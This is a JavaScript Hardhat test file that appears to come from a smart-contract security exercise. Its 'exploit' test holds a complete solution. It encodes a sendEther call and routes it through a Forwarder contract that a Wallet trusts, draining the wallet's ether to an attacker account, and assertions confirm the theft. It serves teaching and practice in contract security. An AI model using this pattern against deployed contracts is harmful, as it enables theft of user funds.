const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const WALLET_NAME = "Wallet";
const FORWARDER_NAME = "Forwarder";
const NAME = "Forwarder tests";

describe(NAME, function () {
    async function setup() {
        const [, attackerWallet] = await ethers.getSigners();
        const value = ethers.utils.parseEther("1");

        const forwarderFactory = await ethers.getContractFactory(FORWARDER_NAME);
        const forwarderContract = await forwarderFactory.deploy();

        const walletFactory = await ethers.getContractFactory(WALLET_NAME);
        const walletContract = await walletFactory.deploy(forwarderContract.address, { value: value });

        return { walletContract, forwarderContract, attackerWallet };
    }

    describe("exploit", async function () {
        let walletContract, forwarderContract, attackerWallet, attackerWalletBalanceBefore;
        before(async function () {
            ({ walletContract, forwarderContract, attackerWallet } = await loadFixture(setup));
            attackerWalletBalanceBefore = await ethers.provider.getBalance(attackerWallet.address);
        });

        it("conduct your attack here", async function () {
            // Step 1: Encode the Function Selector
            const functionSignature = "sendEther(address,uint256)";
            const functionSelector = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(functionSignature)).slice(0, 10); // Take only the first 4 bytes (8 characters + '0x')

            // Step 2: Encode the Parameters (already done in your selection)
            const data1 = ethers.utils.defaultAbiCoder.encode(
                ["address", "uint256"],
                [attackerWallet.address, ethers.utils.parseEther("1")]
            );

            // Step 3: Combine the Selector and Parameters
            const encodedData1 = functionSelector + data1.slice(2); // Remove '0x' from data when concatenating
            // Correct usage: Create a new instance of the contract connected to the attackerWallet
            const forwarderContractWithSigner = forwarderContract.connect(attackerWallet);

            // Now use this instance to call the forward function
            await forwarderContractWithSigner.functionCall(walletContract.address, encodedData1);
        });

        after(async function () {
            const attackerWalletBalanceAfter = await ethers.provider.getBalance(attackerWallet.address);
            expect(attackerWalletBalanceAfter.sub(attackerWalletBalanceBefore)).to.be.closeTo(
                ethers.utils.parseEther("1"),
                1000000000000000
            );

            const walletContractBalance = await ethers.provider.getBalance(walletContract.address);
            expect(walletContractBalance).to.be.equal("0");
        });
    });
});
